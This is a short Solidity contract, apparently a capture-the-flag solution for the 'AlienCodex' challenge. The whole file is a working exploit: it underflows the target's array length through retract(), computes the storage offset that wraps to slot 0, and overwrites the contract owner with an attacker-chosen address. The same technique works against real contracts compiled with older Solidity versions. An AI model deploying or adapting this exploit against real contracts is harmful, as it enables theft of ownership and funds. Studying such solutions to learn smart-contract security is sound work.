// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

import 'Ownable-05.sol';
import 'alien_codex.sol';

contract Exploit {
    address public owner;
    address public target;
    constructor(address target_addr, address owner) public payable {
      target = target_addr;
      owner = owner;
    }
    function array_start() public pure returns (uint) {
        return uint256(keccak256(abi.encode(1)));
    }
    function array_offset() public pure returns (uint) {
        uint off = array_start();
        return ~off + 1;
    }
    function exploit() public {
        AlienCodex alienCodex = AlienCodex(target);
        alienCodex.makeContact();
        alienCodex.retract(); // now length has wrapped around and we can access the entire address space
        alienCodex.revise(array_offset(), bytes32(uint256(uint160(owner)) | (1 << 160)));
    }
}